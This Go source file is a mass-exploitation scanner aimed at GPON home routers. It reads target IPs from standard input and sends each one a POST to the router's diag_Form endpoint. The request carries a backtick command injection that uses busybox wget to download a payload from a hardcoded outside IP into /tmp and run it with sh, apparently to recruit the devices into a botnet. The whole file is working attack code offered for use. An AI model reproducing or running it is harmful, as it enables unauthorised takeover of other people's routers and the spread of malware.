package main

import (
//"fmt"
"net/http"
"sync"
"bufio"
"time"
"os"
"strings"
"bytes"
)
var payload []byte = []byte("XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://213.183.53.120/gpon+-O+/tmp/ts;sh+/tmp/ts`&ipv=0")

var wg sync.WaitGroup    
var queue []string;

func work(ip string){
    ip = strings.TrimRight(ip, "\r\n")
    url := "http://"+ip+":8080/GponForm/diag_Form?images/"
    tr := &http.Transport{
        ResponseHeaderTimeout: 5*time.Second,
        DisableCompression: true,
    }
    client := &http.Client{Transport: tr, Timeout: 5*time.Second}
    _, _ = client.Post(url, "text/plain", bytes.NewBuffer(payload))
}


func main(){
    for {
        r := bufio.NewReader(os.Stdin)
        scan := bufio.NewScanner(r)
        for scan.Scan(){
            go work(scan.Text())
            wg.Add(1)
            time.Sleep(2*time.Millisecond)
        }
    }

}
